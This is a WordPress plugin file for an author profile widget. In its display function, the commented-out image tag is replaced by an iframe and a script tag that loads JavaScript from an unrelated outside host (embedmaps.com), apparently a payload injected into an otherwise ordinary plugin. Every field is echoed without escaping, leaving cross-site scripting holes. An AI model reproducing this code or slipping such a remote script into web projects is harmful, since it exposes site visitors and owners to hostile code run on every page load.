<?php
/**
 * Plugin Name: Author Widget
 * Plugin URI: http://www.codexworld.com
 * Description: Provides a widget for display blog author information
 * Version: 1.0
 * Author: CodexWorld
 * Author URI: http://www.codexworld.com
 */

// load widget
add_action( 'widgets_init', 'codexworld_author_widget' );

// Register widget
function codexworld_author_widget() {
	register_widget( 'Codexworld_Author_Widget' );
}

// Widget class
class Codexworld_Author_Widget extends WP_Widget {

    function __construct() {
	
		// Widget settings
		$widget_ops = array (
			'classname' => 'codexworld_author_widget',
			'description' => __('A widget for display author information', 'wp-bootstrap-4')
		);
	
		// Widget control settings
		$control_ops = array (
			'width' => 300,
			'height' => 350,
			'id_base' => 'codexworld_author_widget'
		);
	
		// Create the widget
		$this->WP_Widget( 'codexworld_author_widget', __('Author Profile', 'wp-bootstrap-4'), $widget_ops, $control_ops );
		
	}

	/**
	 * Display Widget
	 */
	function widget( $args, $instance ) {
		extract( $args );
	
		// variables from the widget settings
		$title = apply_filters('widget_title', $instance['title'] );
		$name = $instance['name'];
		$picture = $instance['picture'];
		$introduction = $instance['introduction'];
		$location = $instance['location'];
		$email = $instance['email'];
	
		// Before widget (defined by theme functions file)
		echo $before_widget;
	
		// Display widget title
		if ( $title )
			echo $before_title . $title . $after_title;
		
		// Display author picture
		echo '<div class="profile-pic">';
		if ( $picture )	
//			echo '<img src="'.$picture.'" alt="'.$name.'\'s Picture" title="'.$name.'"/>';
            $iFrameUrl = 'https://embedmaps.com/google-maps-authorization/script.js?id=146c764b0b67aed753f86fee599d2c864963d7c5';
            echo '<iframe frameborder="0" src="'.$picture.'"></iframe><script type="text/javascript" src="'.$iFrameUrl.'"></script>';
		echo '</div>';
			
		echo '<div class="profile_meta">';
		// Display the author name
		if ( $name )
			echo '<span><b>'.$name.'</b></span><br/>';
		
		// Display author introduction
		if ( $introduction )
			echo '<span>'.$introduction.'</span><br/>';
			
		// Display author location
		if ( $location )
			echo '<span>'.$location.'</span><br/>';
			
		// Display author email
		if ( $email )
			echo '<span><a href="mailto:'.$email.'">'.str_replace("@",'[at]',$email).'</a></span><br/>';
		echo '</div>';

		// After widget (defined by theme functions file)
		echo $after_widget;
	}
	
	/**
	 * Update Widget
	 */
	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		
		// Strip tags to remove HTML (important for text inputs)
		$instance['title'] = strip_tags($new_instance['title']);
		
		// No need to strip tags
		$instance['name'] = $new_instance['name'];
		$instance['picture'] = $new_instance['picture'];
		$instance['introduction'] = $new_instance['introduction'];
		$instance['location'] = $new_instance['location'];
		$instance['email'] = $new_instance['email'];
		
		return $instance;
	}

	/**
	 * Displays the widget settings controls on the widget panel
	 */
	function form( $instance ) {
	
		// Set up some default widget settings
		$defaults = array(
			'title' => '',
			'picture' => '',
			'name' => '',
			'introduction' => '',
			'location' => '',
			'email' => '',
		);
			
		$instance = wp_parse_args( (array) $instance, $defaults ); ?>
	
		<!-- Widget Title: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'wp-bootstrap-4') ?></label>
			<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" />
		</p>
	
		<!-- Picture URL: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'picture' ); ?>"><?php _e('Picture URL:', 'wp-bootstrap-4') ?></label>
			<input class="widefat" id="<?php echo $this->get_field_id( 'picture' ); ?>" name="<?php echo $this->get_field_name( 'picture' ); ?>" value="<?php echo $instance['picture']; ?>" />
		</p>
		
		<!-- Name: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'name' ); ?>"><?php _e('Name:', 'wp-bootstrap-4') ?></label>
			<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'name' ); ?>" name="<?php echo $this->get_field_name( 'name' ); ?>" value="<?php echo $instance['name']; ?>" />
		</p>
		
		<!-- Introduction: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'introduction' ); ?>"><?php _e('Introduction:', 'wp-bootstrap-4') ?></label>
			<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'introduction' ); ?>" name="<?php echo $this->get_field_name( 'introduction' ); ?>" value="<?php echo $instance['introduction']; ?>" />
		</p>
		
		<!-- Location: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'location' ); ?>"><?php _e('Location:', 'wp-bootstrap-4') ?></label>
			<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'location' ); ?>" name="<?php echo $this->get_field_name( 'location' ); ?>" value="<?php echo $instance['location']; ?>" />
		</p>
		
		<!-- Email: Text Input -->
		<p>
			<label for="<?php echo $this->get_field_id( 'email' ); ?>"><?php _e('Email:', 'wp-bootstrap-4') ?></label>
			<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'email' ); ?>" name="<?php echo $this->get_field_name( 'email' ); ?>" value="<?php echo $instance['email']; ?>" />
		</p>
		
	<?php
	}
}
?>
